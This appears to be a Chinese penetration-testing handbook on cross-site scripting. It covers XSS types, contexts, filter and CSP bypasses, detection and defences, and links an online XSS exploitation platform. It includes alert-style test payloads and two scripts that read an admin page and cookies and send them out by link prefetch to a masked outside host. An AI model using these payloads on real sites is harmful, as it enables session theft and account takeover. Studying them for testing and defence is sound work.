# EXP手册-Cross-site scripting

## 一句话理解
XSS（Cross-site Scripting）本质是攻击者将可执行脚本注入到受害者浏览器的解析上下文中执行，利用的是用户对目标站点的信任。

## 漏洞分类
### 1. 反射型 XSS
恶意输入进入服务端后立即出现在响应页面中，通常需要用户点击带参数的链接才能触发。

### 2. 存储型 XSS
恶意内容被写入数据库、评论区、个人资料、工单系统、富文本等位置，其他用户访问时会持续触发，危害通常最大。

### 3. DOM 型 XSS
漏洞不一定经过服务端，问题出在前端脚本把不可信数据写入危险 DOM 接口，例如 `innerHTML`、`document.write`、`location` 拼接。

### 4. 基于模板的前端注入
典型是 Client-Side Template Injection（CSTI），模板表达式先被框架执行，再进一步转成 XSS。

## 常见攻击面
- 搜索框、登录失败提示、跳转提示页
- 评论区、留言板、工单、昵称、个性签名
- 富文本编辑器、Markdown 渲染、站内信
- URL 参数回显、`location.hash`、`postMessage`
- 前端路由、SPA 页面模板、第三方组件
- 后台管理系统中的预览、导入、消息通知模块

## 常见利用目标
- 窃取可读的会话数据，如 `localStorage`、页面中的 Token、用户敏感信息
- 冒充受害者发起站内操作，例如改邮箱、加管理员、发帖、转账
- 读取后台页面内容并回传
- 钓鱼、挂马、键盘记录、投递后续利用链
- 与 CSRF、CSP 配置错误、开放重定向等漏洞组合利用

> 注意：`HttpOnly` Cookie 无法直接通过 `document.cookie` 读取，但 XSS 依然可以借助受害者身份执行敏感操作。

## 基础利用
### 1. 最基础的测试载荷
```html
<script>alert('XSS')</script>
```

### 2. 当标签被过滤时
```html
<img src=x onerror=alert(1)>
```

### 3. 当输入落在属性值中
```html
" autofocus onfocus=alert(1) x="
```

### 4. 当输入落在 JavaScript 字符串中
```javascript
';alert(1);//
```

### 5. DOM 型高危 Sink
以下接口一旦写入不可信数据，就很容易形成 XSS：
- `innerHTML`
- `outerHTML`
- `document.write`
- `insertAdjacentHTML`
- `eval`
- `setTimeout(string)`
- `new Function()`

## 上下文意识
XSS 是否可利用，核心取决于“输入最终落在哪个解析上下文中”。

### 1. HTML 上下文
重点看是否能闭合标签、插入新标签、触发事件属性。

### 2. HTML 属性上下文
重点看是否能跳出引号，或直接进入事件属性如 `onload`、`onclick`。

### 3. JavaScript 上下文
重点看是否能逃逸字符串、对象字面量、模板字符串或注释。

### 4. URL 上下文
重点看是否可控 `href`、`src`、`action`，以及是否能使用 `javascript:`、`data:` 等协议。

### 5. CSS 上下文
现代浏览器中直接通过 CSS 执行脚本已受较多限制，但仍需关注样式注入、外链加载、旧环境兼容问题。

## 常见绕过思路
### 1. 绕过标签过滤
- 大小写混写
- 利用浏览器容错解析
- 使用非 `script` 标签，如 `img`、`svg`、`iframe`
- 借助事件属性，如 `onerror`、`onload`、`onmouseover`

### 2. 绕过关键字过滤
- 编码变形：HTML 实体、URL 编码、Unicode 编码
- 字符串拼接、模板字符串、大小写拆分
- 利用浏览器自动补全和解析差异

### 3. 无尖括号场景
当 `<`、`>` 被过滤时，优先考虑：
- 属性逃逸
- JavaScript 字符串逃逸
- 模板表达式注入
- 现有 DOM 结构中的事件触发点

### 4. 黑名单绕过
XSS 最忌“黑名单过滤”。常见问题：
- 只过滤 `script`，不处理事件属性
- 只替换一次，导致双写绕过
- 服务端和前端解码次数不一致
- 某些字符被过滤，但可被其他编码方式还原

### 5. 富文本与 Markdown
这类场景经常表现为“看起来做了过滤，但只过滤了少数标签”：
- 允许 HTML 白名单但规则过宽
- 对链接协议校验不足，允许危险协议
- 图片、音视频、公式、代码块渲染链中存在二次注入

## CSP 相关
### 1. 认识 CSP
CSP（Content Security Policy）用于限制页面可加载和可执行的资源来源，是缓解 XSS 的重要机制，但配置错误时仍可被绕过。

同源的判断标准是：协议、域名、端口三者都相同。

- CSP 在线检测工具：https://csp-evaluator.withgoogle.com/
- [同源策略详解及绕过方法](http://zjw.dropsec.xyz/CTF/2016/12/13/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E8%AF%A6%E8%A7%A3%E5%8F%8A%E7%BB%95%E8%BF%87-%E8%BD%AC.html)

### 2. 常见错误配置
- 使用 `'unsafe-inline'`
- 允许过宽的第三方脚本域
- 把 JSONP、Angular、旧版前端库所在域加入白名单
- `script-src` 限制严格，但忽略了其他可外带数据的资源类型
- 只依赖 CSP，不做上下文输出编码

### 3. 绕过思路
- 借助白名单域上的可控脚本或 JSONP
- 利用现有页面脚本能力，在同源下读取敏感页面
- 通过图片、链接预取、表单、导航等方式带出数据
- 结合 DOM Clobbering、模板注入、前端框架 gadget

### 4. 利用 `<link>` 进行数据外带
下面这个例子是利用同源脚本能力读取内容，再借助 `link prefetch` 外带数据：

```html
<script>
$.get("admin.php", function(data) {
  var content = window.btoa(document.cookie).concat(window.btoa(data));
  var n0t = document.createElement("link");
  n0t.setAttribute("rel", "prefetch");
  n0t.setAttribute("href", "http://***/".concat(content));
  document.head.appendChild(n0t);
});
</script>
```

在此基础上，也可以先请求同源页面，再把页面内容编码后发送出去：

```html
<script>
getText = function(url, callback) {
  var request = new XMLHttpRequest();
  request.onreadystatechange = function() {
    if (request.readyState == 4 && request.status == 200) {
      callback(request.responseText);
    }
  };
  request.open("GET", url);
  request.send();
}
function mycallback(data) {
  var content = window.btoa(data);
  var n0t = document.createElement("link");
  n0t.setAttribute("rel", "prefetch");
  n0t.setAttribute("href", "http://*****/".concat(content));
  document.head.appendChild(n0t);
}
getText("admin.php", mycallback);
</script>
```

## 特殊场景
### 1. Client-Side Template Injection
某些前端框架会先解析模板表达式，再把结果写入页面，最终形成 XSS。

- [XSS without HTML: Client-Side Template Injection with AngularJS](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)

关键词：客户端模板注入、AngularJS、沙箱逃逸、表达式执行。

### 2. 后台管理系统
后台场景通常更值得关注：
- 管理员权限高，单次 XSS 回报更大
- 往往能访问内网接口、工单内容、用户数据
- 常和富文本、日志预览、导入导出、审核流结合

### 3. 第三方脚本供应链
即使业务代码本身没有明显 XSS，若页面允许加载可控第三方脚本，仍可能退化为站点级 XSS。

## 检测思路
### 1. 手工测试
- 先确认输入是否回显
- 再判断回显位置属于哪种上下文
- 最后按上下文逐步构造最小 payload

### 2. DOM 型排查
重点检索：
- 来源：`location`、`document.URL`、`document.referrer`、`postMessage`
- 去向：`innerHTML`、`eval`、`document.write`、`setAttribute`

### 3. 实战技巧
- 先构造“是否可控”的探针，再构造真正执行逻辑
- 关注浏览器开发者工具中的 DOM 变化
- 关注前端框架二次渲染和客户端路由

## 防御要点
### 1. 按上下文做输出编码
这是防 XSS 的核心，不是简单的“全局过滤特殊字符”。

### 2. 避免危险 DOM API
尽量使用安全文本接口，如：
- `textContent`
- `innerText`
- 安全模板渲染方案

### 3. 富文本严格白名单
- 标签白名单
- 属性白名单
- 协议白名单
- 防止二次渲染绕过

### 4. 启用 CSP 但不要迷信 CSP
建议结合：
- nonce 或 hash
- 禁止内联脚本
- 限制第三方脚本来源

### 5. Cookie 安全属性
虽然不能根治 XSS，但有助于减轻后果：
- `HttpOnly`
- `Secure`
- `SameSite`

## 速查清单
- 先判定类型：反射型、存储型、DOM 型、模板注入
- 先判定上下文：HTML、属性、JavaScript、URL
- 优先找高危 Sink：`innerHTML`、`eval`、事件属性
- 检查富文本、Markdown、后台预览、消息通知
- 检查 CSP 是否存在错误白名单或可利用的同源脚本能力
- 关注 XSS 是否可转化为后台接管、数据外带、内网访问

## Reference
- XSS online 利用平台：https://xsspt.com/
- [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
- [AMP HTML 关于 XSS 的 CTF Writeup](https://xz.aliyun.com/t/2347)
